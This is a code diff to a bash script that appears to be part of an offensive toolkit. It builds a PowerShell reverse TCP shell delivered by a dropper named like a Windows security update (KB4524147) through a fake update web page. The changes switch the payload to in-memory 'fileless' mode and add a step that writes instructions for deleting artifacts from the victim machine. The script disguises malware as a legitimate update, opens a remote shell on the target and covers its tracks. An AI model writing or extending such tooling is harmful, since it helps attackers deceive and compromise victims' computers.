@@ -12021,7 +12021,7 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Drop.\nRemark: Only PS environment var's accepted" --entry --width 350) > /dev/null 2>&1
 fi
 
@@ -12043,7 +12043,7 @@ cat << !
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : Fileless (\$env:$rpath)
+    UPLOADTO : Fileless (In-Memory)
     SILENT EXECUTION : $easter_egg
 !
 echo "---"
@@ -12164,6 +12164,13 @@ rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
+if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
+   random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
+   zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_$random_name.txt" --info > /dev/null 2>&1
+   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_$random_name.txt
+   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_$random_name.txt
+   echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_$random_name.txt
+fi
 sh_menu
 }
 
